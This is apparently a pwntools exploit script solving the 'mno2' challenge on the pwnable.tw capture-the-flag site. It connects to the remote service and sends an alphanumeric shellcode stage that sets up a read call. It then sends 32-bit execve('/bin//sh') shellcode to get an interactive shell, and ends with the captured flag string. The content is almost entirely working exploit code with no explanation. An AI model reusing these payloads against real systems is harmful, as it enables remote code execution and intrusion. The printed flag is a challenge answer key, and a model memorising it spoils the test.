from pwn import *

elf = ELF("mno2")
r = remote('chall.pwnable.tw', 10301)

intro = 'N3P2' + '1Pu' + 'SPPSPUSP' + 'a' + '3Lr6' + '3Lr8' + 'Pu1' + 'FN' * 0xB + 'F'
xor1 = 'B1' + 'ND' + 'yO4N' + '4N'  # 3a
outro = 'FN' * 0x7 + 'OOO' + 'CCC' + 'SXe' + 'KKK' + 'F' * 31 + 'O9NN'
outro2 = 'FN' * 0x15 + 'FN' * 8

payload = intro + xor1 + outro + outro2 + 'CaCa'

# le stolen shellcode
shell = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

sleep(3)
r.sendline(payload)
sleep(3)

# send execve shellcode with our generated read call
r.sendline(shell)
r.interactive()

# FLAG --> FLAG{4(7|-||>4|_||\||>|>|_|4|\/|(|\/|b|<(|=35|=|\/||\/|d|\|0|_.-}
